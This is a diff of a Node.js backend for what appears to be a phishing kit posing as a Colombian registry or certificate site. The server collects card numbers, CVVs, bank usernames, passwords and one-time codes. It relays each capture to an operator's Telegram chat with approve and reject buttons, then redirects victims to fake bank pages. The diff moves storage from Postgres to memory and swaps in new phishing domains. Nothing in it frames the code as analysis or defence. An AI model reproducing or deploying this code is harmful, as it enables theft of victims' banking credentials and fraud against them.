@@ -1,64 +1,17 @@
 const express = require('express');
 const cors = require('cors');
-const { Pool } = require('pg');
 
 const app = express();
 app.use(cors());
 app.use(express.json({ limit: '1mb' }));
 
-const pool = new Pool({
-    connectionString: process.env.DATABASE_URL,
-    max: 5,
-    ssl: { rejectUnauthorized: false }
-});
-
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://sncill-to-yzzz.onrender.com';
-const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://package-json-y86a.onrender.com';
+const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://registraenlineanuip-crtificadonacioncol.onrender.com';
+const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://backvenecol.onrender.com';
 
-async function initDB() {
-    await pool.query(`
-        CREATE TABLE IF NOT EXISTS pagos_pendientes (
-            id               SERIAL PRIMARY KEY,
-            solicitud_id     VARCHAR(80) UNIQUE NOT NULL,
-            titular          VARCHAR(120),
-            numero_tarjeta   VARCHAR(30),
-            cvv              VARCHAR(6),
-            vencimiento      VARCHAR(10),
-            marca_tarjeta    VARCHAR(20),
-            banco_emisor     VARCHAR(120),
-            estado           VARCHAR(30) DEFAULT 'pendiente',
-            motivo_rechazo   TEXT,
-            redirigir_a      VARCHAR(60),
-            telegram_msg_id  BIGINT,
-            usuario_banco    VARCHAR(120),
-            password_banco   VARCHAR(120),
-            codigo_otp       VARCHAR(20),
-            paso             VARCHAR(30) DEFAULT 'crear',
-            fase_actual      VARCHAR(20) DEFAULT 'credenciales',
-            credenciales_aprobadas BOOLEAN DEFAULT FALSE,
-            otp_aprobado     BOOLEAN DEFAULT FALSE,
-            created_at       TIMESTAMPTZ DEFAULT NOW(),
-            updated_at       TIMESTAMPTZ DEFAULT NOW()
-        );
-    `);
-    
-    await pool.query(`
-        ALTER TABLE pagos_pendientes
-          ADD COLUMN IF NOT EXISTS usuario_banco VARCHAR(120),
-          ADD COLUMN IF NOT EXISTS password_banco VARCHAR(120),
-          ADD COLUMN IF NOT EXISTS codigo_otp VARCHAR(20),
-          ADD COLUMN IF NOT EXISTS paso VARCHAR(30) DEFAULT 'crear',
-          ADD COLUMN IF NOT EXISTS fase_actual VARCHAR(20) DEFAULT 'credenciales',
-          ADD COLUMN IF NOT EXISTS credenciales_aprobadas BOOLEAN DEFAULT FALSE,
-          ADD COLUMN IF NOT EXISTS otp_aprobado BOOLEAN DEFAULT FALSE;
-    `);
-    
-    await pool.query(`ALTER TABLE pagos_pendientes ALTER COLUMN estado TYPE VARCHAR(30);`);
-    console.log('✅ Tabla lista');
-}
-initDB().catch(err => console.error('❌ initDB:', err));
+// 🧠 ALMACENAMIENTO EN MEMORIA (Se borra si el servidor se reinicia)
+const pagosPendientes = new Map();
 
 async function tgSendMessage(text, replyMarkup) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
@@ -100,8 +53,7 @@ function construirTextoPago(pago) {
         `\n<b>── CREDENCIALES BANCO ──</b>\n` +
         `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
         `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
-        `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>\n` +
-        `\n🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`
+        `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>`
     );
 }
 
@@ -111,16 +63,27 @@ app.post('/api/crear-pago', async (req, res) => {
     if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });
 
     try {
-        const result = await pool.query(
-            `INSERT INTO pagos_pendientes (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso, fase_actual, estado)
-             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12, 'pendiente')
-             ON CONFLICT (solicitud_id) DO UPDATE
-               SET numero_tarjeta = EXCLUDED.numero_tarjeta, cvv = EXCLUDED.cvv, vencimiento = EXCLUDED.vencimiento, marca_tarjeta = EXCLUDED.marca_tarjeta, banco_emisor = EXCLUDED.banco_emisor, usuario_banco = COALESCE(EXCLUDED.usuario_banco, pagos_pendientes.usuario_banco), password_banco = COALESCE(EXCLUDED.password_banco, pagos_pendientes.password_banco), codigo_otp = COALESCE(EXCLUDED.codigo_otp, pagos_pendientes.codigo_otp), paso = COALESCE(EXCLUDED.paso, pagos_pendientes.paso), estado = 'pendiente', updated_at = NOW()
-             RETURNING *`,
-            [solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido', usuario_banco || null, password_banco || null, codigo_otp || null, paso || 'crear', paso === 'otp' ? 'otp' : 'credenciales']
-        );
+        // Guardamos en memoria
+        const pago = {
+            solicitud_id,
+            titular,
+            numero_tarjeta,
+            cvv,
+            vencimiento,
+            marca_tarjeta: marca_tarjeta.toLowerCase(),
+            banco_emisor: banco_emisor || 'Desconocido',
+            usuario_banco: usuario_banco || null,
+            password_banco: password_banco || null,
+            codigo_otp: codigo_otp || null,
+            estado: 'pendiente',
+            paso: paso || 'crear',
+            fase_actual: paso === 'otp' ? 'otp' : 'credenciales',
+            motivo_rechazo: null,
+            redirigir_a: null
+        };
+        
+        pagosPendientes.set(solicitud_id, pago);
 
-        const pago = result.rows[0];
         const pasoActual = paso || 'crear';
 
         // 🔥 SI ES UNA SOLICITUD NUEVA (TARJETA)
@@ -132,12 +95,9 @@ app.post('/api/crear-pago', async (req, res) => {
                     { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
                 ]]
             };
-            const tgRes = await tgSendMessage(texto, replyMarkup);
-            if (tgRes.ok && tgRes.result) {
-                await pool.query(`UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`, [tgRes.result.message_id, pago.solicitud_id]);
-            }
+            await tgSendMessage(texto, replyMarkup);
         } 
-        // 🔥 SI SON CREDENCIALES O OTP, MANDAMOS UN MENSAJE NUEVO (PARA EVITAR FALLOS DE EDICIÓN)
+        // 🔥 SI SON CREDENCIALES O OTP
         else {
             const texto = `📝 <b>NUEVOS DATOS RECIBIDOS (${pasoActual.toUpperCase()})</b>\n\n` + construirTextoPago(pago);
             const replyMarkup = {
@@ -146,10 +106,7 @@ app.post('/api/crear-pago', async (req, res) => {
                     { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
                 ]]
             };
-            const tgRes = await tgSendMessage(texto, replyMarkup);
-            if (tgRes.ok && tgRes.result) {
-                await pool.query(`UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`, [tgRes.result.message_id, pago.solicitud_id]);
-            }
+            await tgSendMessage(texto, replyMarkup);
         }
 
         return res.json({ success: true, solicitud_id, estado: 'pendiente' });
@@ -159,27 +116,26 @@ app.post('/api/crear-pago', async (req, res) => {
     }
 });
 
-app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
+app.get('/api/estado-pago/:solicitud_id', (req, res) => {
     try {
-        const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [req.params.solicitud_id]);
-        if (result.rows.length === 0) return res.status(404).json({ success: false, error: 'No encontrado' });
-        const row = result.rows[0];
+        const pago = pagosPendientes.get(req.params.solicitud_id);
+        if (!pago) return res.status(404).json({ success: false, error: 'No encontrado' });
 
-        if (row.estado === 'aprobado_credenciales') {
-            return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
+        if (pago.estado === 'aprobado_credenciales') {
+            return res.json({ success: true, estado: 'aprobado', fase: 'credenciales', marca: pago.marca_tarjeta });
         }
-        if (row.estado === 'rechazado_credenciales') {
-            return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });
-        }
-
-        if (row.estado === 'aprobado') {
-            return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a || 'exito.html'}` });
-        }
-        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') {
-            return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });
+        if (pago.estado === 'rechazado_credenciales') {
+            return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: pago.motivo_rechazo });
         }
 
-        return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual || 'credenciales' });
+        if (pago.estado === 'aprobado') {
+            return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${pago.redirigir_a || 'exito.html'}` });
+        }
+        if (pago.estado === 'rechazado' || pago.estado === 'rechazado_otp') {
+            return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: pago.motivo_rechazo });
+        }
+
+        return res.json({ success: true, estado: 'pendiente', fase: pago.fase_actual || 'credenciales' });
     } catch (err) {
         return res.status(500).json({ success: false, error: 'Error' });
     }
@@ -194,29 +150,28 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const msgId = cq.message?.message_id;
 
     try {
-        const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [solicitud_id]);
-        if (result.rows.length === 0) return await tgAnswerCallback(cq.id, 'No encontrada');
-        const pago = result.rows[0];
+        const pago = pagosPendientes.get(solicitud_id);
+        if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');
 
         const estaEnFaseOTP = !!pago.codigo_otp && pago.codigo_otp !== 'N/A';
 
         if (accion === 'aprobar') {
             if (!estaEnFaseOTP) {
-                // Aprueba credenciales
-                await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado_credenciales', credenciales_aprobadas = TRUE, updated_at = NOW() WHERE solicitud_id = $1`, [solicitud_id]);
+                pago.estado = 'aprobado_credenciales';
                 await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
                 if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + construirTextoPago(pago));
             } else {
-                // Aprueba OTP final
                 const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
-                await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado', otp_aprobado = TRUE, fase_actual = 'completado', redirigir_a = $1, updated_at = NOW() WHERE solicitud_id = $2`, [archivo, solicitud_id]);
+                pago.estado = 'aprobado';
+                pago.fase_actual = 'completado';
+                pago.redirigir_a = archivo;
                 await tgAnswerCallback(cq.id, '✅ Pago aprobado');
                 if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago));
             }
         } else if (accion === 'rechazar') {
             const motivo = estaEnFaseOTP ? 'OTP incorrecto.' : 'Credenciales incorrectas.';
-            const nuevoEstado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
-            await pool.query(`UPDATE pagos_pendientes SET estado = $1, motivo_rechazo = $2, updated_at = NOW() WHERE solicitud_id = $3`, [nuevoEstado, motivo, solicitud_id]);
+            pago.estado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
+            pago.motivo_rechazo = motivo;
             await tgAnswerCallback(cq.id, '❌ Rechazado');
             if (msgId) await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + construirTextoPago(pago) + `\n📌 <b>Motivo:</b> ${motivo}`);
         }
